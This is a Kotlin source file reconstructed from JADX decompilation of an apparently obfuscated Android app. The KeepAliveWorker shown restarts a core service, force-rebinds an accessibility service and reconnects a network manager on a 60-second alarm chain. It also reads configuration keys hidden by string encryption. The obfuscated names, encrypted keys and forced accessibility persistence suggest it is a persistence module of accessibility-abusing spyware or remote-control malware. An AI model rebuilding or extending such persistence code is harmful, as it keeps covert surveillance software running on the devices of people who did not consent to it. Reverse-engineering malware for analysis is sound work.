package com.storm.safe.rock.keepalive

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.SystemClock
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.storm.safe.rock.service.AppCoreService
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.ActivityMonitor
import com.storm.safe.rock.service.tisxhskrc
import com.storm.safe.rock.util.StringUtil

/**
 * WorkManager-based periodic keepalive worker.
 *
 * Reverse-engineered from JADX: keepalive/KeepAliveWorker.java (125 LOC).
 *
 * doWork():
 * 1. ensureCoreServiceRunning — start AppCoreService if not running,
 *    rebind AccessibilityService if dead, or reconnect network if needed
 * 2. scheduleNextAlarm — set 60s AlarmManager alarm for heartbeat chain,
 *    then verify accessibility health
 *
 * Always returns Result.success() to avoid retry storms.
 */
class KeepAliveWorker(context: Context, params: WorkerParameters) : Worker(context, params) {

    companion object {
        const val TAG = "KeepAliveWorker"

        /** Alarm request code for heartbeat chain */
        private const val HEARTBEAT_ALARM_REQUEST_CODE = 99

        /** Alarm delay: 60 seconds */
        private const val ALARM_DELAY_MS = 60_000L

        /** PendingIntent flags: FLAG_UPDATE_CURRENT | FLAG_IMMUTABLE */
        // ADAPT: 201326592 = 0x0C000000 = FLAG_UPDATE_CURRENT(0x08000000) | FLAG_IMMUTABLE(0x04000000)
        private const val PI_FLAGS = PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
    }

    /**
     * JADX: mo210458a6 (doWork)
     *
     * Calls ensureCoreServiceRunning + scheduleNextAlarm.
     * On failure, logs to MainOrchestrator. Always returns success.
     */
    override fun doWork(): Result {
        try {
            ensureCoreServiceRunning()
            scheduleNextAlarm()
        } catch (e: Exception) {
            Log.e(TAG, "保活任务失败", e)
            // JADX: logs to AbstractC0315a0.m211545a7 → ActivityMonitor.logMessage
            try {
                ActivityMonitor.logMessage("保活任务执行失败 " + e.message)
            } catch (_: Exception) {
                // Ignore secondary logging failure
            }
        }
        return Result.success()
    }

    /**
     * JADX: m211239a7 — ensure core service and accessibility are alive.
     *
     * Logic:
     * 1. If AppCoreService not running → start it
     * 2. If MyAccessibilityService.getInstance() == null → tryForceRebindAccessibility
     * 3. Else (accessibility alive) → check SharedPrefs for auto-connect flag,
     *    if enabled → check NetworkManager.isHealthy, reconnect if not
     */
    private fun ensureCoreServiceRunning() {
        val context = applicationContext

        // JADX: if (!c0277a0.isRunning()) → start
        if (!AppCoreService.isRunning()) {
            AppCoreService.start(context)
        }

        // JADX: if (dqtvuisjd.f52358m1.getInstance() == null)
        if (MyAccessibilityService.getInstance() == null) {
            // Accessibility service is dead — try force rebind
            tisxhskrc.tryForceRebindAccessibility(context)
        } else {
            // Accessibility service is alive — check network health
            try {
                // JADX: SharedPreferences with encrypted keys
                // StringUtil.m212470a0("KkkBBV4sDTpS") = pref file name
                // StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU=") = auto-connect key
                val prefs = context.getSharedPreferences(
                    StringUtil.decrypt("KkkBBV4sDTpS"), Context.MODE_PRIVATE
                )
                val autoConnect = prefs.getBoolean(
                    StringUtil.decrypt("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false
                )
                if (autoConnect) {
                    // JADX: C0323a8.f53097e0.getOrCreate(context).m211643a8()
                    // m211643a8 = reconnect/ensureConnected on NetworkManager
                    val networkManager = MyAccessibilityService.getInstance()?.getNetworkManager()
                    if (networkManager != null && !networkManager.isHealthy()) {
                        networkManager.ensureConnected()
                    }
                }
            } catch (_: Exception) {
                // Ignore network check failure
            }
        }
    }

    /**
     * JADX: m211240a8 — schedule next 60s AlarmManager alarm + health check.
     *
     * 1. Schedule exact alarm (ELAPSED_REALTIME_WAKEUP) for 60s via tisxhskrc receiver
     * 2. Check accessibility health: if service alive + serviceReady → check isConnected
     */
    private fun scheduleNextAlarm() {
        val context = applicationContext

        // ── Part 1: Schedule 60s alarm ──
        try {
            val intent = Intent(context, tisxhskrc::class.java).apply {
                action = tisxhskrc.ACTION_BACKUP_SYNC
            }
            val broadcast = PendingIntent.getBroadcast(
                context, HEARTBEAT_ALARM_REQUEST_CODE, intent, PI_FLAGS
            )
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val triggerAt = SystemClock.elapsedRealtime() + ALARM_DELAY_MS
            // JADX: Build.VERSION.SDK_INT >= 31 ? canScheduleExactAlarms() : true
            val canExact = if (Build.VERSION.SDK_INT >= 31) {
                alarmManager.canScheduleExactAlarms()
            } else {
                true
            }
            if (canExact) {
                alarmManager.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, broadcast
                )
            } else {
                alarmManager.setAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, broadcast
                )
            }
        } catch (_: Exception) {
            // Ignore alarm scheduling failure
        }

        // ── Part 2: Accessibility health check ──
        try {
            val service = MyAccessibilityService.getInstance()
            if (service != null && MyAccessibilityService.isServiceReady()) {
                val isConnected = try {
                    service.getNetworkManager()?.isHealthy() ?: false
                } catch (_: Exception) {
                    false
                }
                if (isConnected) {
                    return
                }
                Log.d(TAG, "健康检查：网络断开，等待自动恢复")
            }
        } catch (e: Exception) {
            Log.e(TAG, "健康检查执行失败", e)
        }
    }
}
